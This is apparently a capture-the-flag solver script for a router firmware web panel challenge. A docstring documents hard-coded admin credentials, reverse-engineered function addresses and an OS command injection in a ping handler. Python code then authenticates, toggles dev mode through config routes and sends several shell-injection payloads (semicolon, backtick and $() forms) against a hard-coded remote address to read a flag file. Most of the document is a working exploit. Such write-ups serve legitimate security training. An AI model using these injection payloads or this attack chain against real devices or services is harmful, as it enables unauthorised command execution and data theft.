#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Router Web (HTB TryOut, pwn/firmware, medium) — solver
======================================================
Firmware: ARM32 Buildroot rootfs booted under QEMU versatilepb (run.sh forwards
tcp 1337/1338/31337). The new web service `router-web-panel` (C++ / Crow) listens
on port 31337 as user `rweb`, cwd /opt/router-web-panel (flag at ./flag.txt).

Auth: BasicAuthMiddleware::before_handle() compares against the hard-coded pair
      admin:router123 embedded in .rodata.

Routes (from install_routes): /admin, POST /admin/ping, /configs/list,
/configs/save, /configs/current, /configs/update, /configs/use/<name>,
/configs/delete/<name>, /devices, /devices/add, /devices/update, /static/<path>.

Vulnerability: OS command injection.
  ping_handler (0x66c68):
    - checks global dev_mode_enabled (0x85654); if 0 -> "Dev Mode Not Enabled".
    - takes POST body param `ip`, builds  "ping -c 1 " + ip  (basic_string append),
      and passes it to execCommand().
  execCommand (0x1ffec) calls popen(cmd, "r") — i.e. runs through /bin/sh -c.
There is NO IP validation / allow-list between the form value and popen, so shell
metacharacters in `ip` inject commands. Output is captured with fgets and rendered
back into admin.mustache as {{output}}.

Chain:
  1) Basic-auth as admin:router123.
  2) Enable dev mode via the config subsystem (the panel exposes enable_dev_mode /
     disable_dev_mode driven by the current config; save+use a config, or POST the
     config form). See enable_dev_mode() at 0x1f958.
  3) POST /admin/ping with  ip = "127.0.0.1; cat flag.txt"  -> flag in {{output}}.

Flag file (confirmed from the extracted rootfs): /opt/router-web-panel/flag.txt
(local bundle ships a placeholder HTB{FakeFlagForTesting}; the real flag is
server-side and requires a running QEMU/remote instance).
"""
import sys, re
try:
    import requests
except ImportError:
    requests = None

AUTH = ("admin", "router123")
INJECTIONS = [
    "127.0.0.1; cat flag.txt",
    "127.0.0.1; cat /opt/router-web-panel/flag.txt",
    "127.0.0.1 `cat flag.txt`",
    "$(cat flag.txt)",
]

def try_enable_dev_mode(base, s):
    # Best-effort: drive the config subsystem so enable_dev_mode() runs.
    for path, data in [
        ("/configs/save",   {"name": "pwn"}),
        ("/configs/use/pwn", None),
        ("/configs/current", {"dns1": "1.1.1.1", "dns2": "8.8.8.8",
                              "firewall": "High", "portForwarding": ""}),
        ("/configs/update", {"dns1": "1.1.1.1", "dns2": "8.8.8.8",
                             "firewall": "High", "portForwarding": ""}),
    ]:
        try:
            if data is None:
                s.get(base + path, timeout=5)
            else:
                s.post(base + path, data=data, timeout=5)
        except Exception:
            pass

def solve(host, port):
    base = "http://%s:%d" % (host, port)
    s = requests.Session(); s.auth = AUTH
    try_enable_dev_mode(base, s)
    for ip in INJECTIONS:
        r = s.post(base + "/admin/ping", data={"ip": ip}, timeout=8)
        m = re.search(r"HTB\{[^}]*\}", r.text)
        print("[*] ip=%r -> %s" % (ip, "FLAG " + m.group(0) if m else
              ("Dev Mode Not Enabled" if "Dev Mode Not Enabled" in r.text else "no flag")))
        if m:
            open("final_flag.txt", "w").write(m.group(0) + "\n")
            return m.group(0)
    return None

if __name__ == "__main__":
    if requests is None:
        sys.exit("pip install requests, and provide a live host:port")
    if len(sys.argv) == 3:
        host, port = sys.argv[1], int(sys.argv[2])
    else:
        host, port = "154.57.164.68", 31010   # HTB TryOut instance (browser)
    print(solve(host, port))
